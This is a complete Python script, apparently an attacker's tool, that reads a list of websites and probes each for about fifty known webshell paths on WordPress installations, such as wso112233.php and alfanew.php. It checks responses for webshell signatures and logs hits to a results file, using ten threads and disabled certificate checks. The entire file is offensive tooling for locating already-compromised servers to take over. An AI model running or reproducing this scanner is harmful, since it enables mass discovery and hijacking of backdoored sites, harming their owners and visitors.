import sys
import requests
import re
import random
import string
from multiprocessing.dummy import Pool
from colorama import Fore, init

init(autoreset=True)
fr = Fore.RED
fg = Fore.GREEN

banner = '''
[+] FLASHKISS :)

$$\   $$\  $$$$$$\        $$$$$$$\  $$$$$$\ $$$$$$$$\ 
$$$\  $$ |$$  __$$\       $$  __$$\ \_$$  _|$$  _____|
$$$$\ $$ |$$ /  $$ |      $$ |  $$ |  $$ |  $$ |      
$$ $$\$$ |$$ |  $$ |      $$ |  $$ |  $$ |  $$$$$\    
$$ \$$$$ |$$ |  $$ |      $$ |  $$ |  $$ |  $$  __|   
$$ |\$$$ |$$ |  $$ |      $$ |  $$ |  $$ |  $$ |      
$$ | \$$ | $$$$$$  |      $$$$$$$  |$$$$$$\ $$$$$$$$\ 
\__|  \__| \______/       \_______/ \______|\________|
'''
print(fg + banner)

requests.packages.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit(f'\n  [!] Enter <{path[-1]}> <sites.txt>')

def ran(length):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

Pathlist = [
    '/wp-content/plugins/core/include.php', '/ws.php', '/404.php', '/wp.php', 
    '/wp-head.php', '/wp-includes/wp-class.php', '/wp-content/themes/twenty/twenty.php', 
    '/wp-content/plugins/press/wp-class.php', '/fm1.php', '/alfadheat.php', '/M1.php', 
    '/admin.php', '/wp-admin/images/admin.php', '/alfanew.php7', '/.well-known/wso112233.php', 
    '/about.php', '/wp-content/shell20211028.php', '/repeater.php', 
    '/wp-content/themes/finley/min.php', '/wso112233.php', '/dropdown.php', 
    '/wp-admin/dropdown.php', '/shell20211028.php', '/wp-content/plugins/Cache/Cache.php', 
    '/wp-includes/IXR/themes.php', '/.well-known/pki-validation/about.php', '/wp-header.php', 
    '/alfanew.php', '/wp-includes/ID3/about.php', '/wp-2019.php', '/autoload_classmap.php', 
    '/wp-includes/ID3/wp-login.php', '/wp-includes/SimplePie/plugins.php', 
    '/wp-content/plugins/alfa-rex.php', '/wp-content/plugins/about.php', '/wp-content/themes/about.php', 
    '/ioxi002.PhP7', '/ynz.PhP7', '/themes.php', '/erin1.PhP7', '/fosil.php', 
    '/ws.php.php', '/ws.php', '/wp-admin/user/wp-login.php', '/wp-includes/images/wp-login.php', 
    '/.well-known/pki-validation/wp-login.php', '/wp-admin/wp-login.php', '/wp-includes/wp-login.php', 
    '/cgi-bin/wp-login.php', '/.wp-cli/wp-login.php', '/wp-content/uploads/wp-login.php'
]

class EvaiLCode:
    def __init__(self):
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36'
        }

    def URLdomain(self, site):
        site = re.sub(r'^https?://', '', site)
        return site.split('/')[0]

    def checker(self, site):
        try:
            url = "http://" + self.URLdomain(site)
            for Path in Pathlist:
                full_url = url + Path
                response = requests.get(full_url, headers=self.headers, verify=False, timeout=25)
                if "Uname:" in response.text or "Yanz Webshell!" in response.text:
                    print(f'{fg}Check [+] {full_url} - Successfully')
                    with open('Results.txt', 'a') as result_file:
                        result_file.write(full_url + "\n")
                    break
                else:
                    print(f'{fr}Check [x] {full_url} - Failed')
        except Exception as e:
            print(f'{fr}Error: {e}')

def flashkiss(site):
    Control.checker(site)

Control = EvaiLCode()
mp = Pool(10)
mp.map(flashkiss, target)
mp.close()
mp.join()
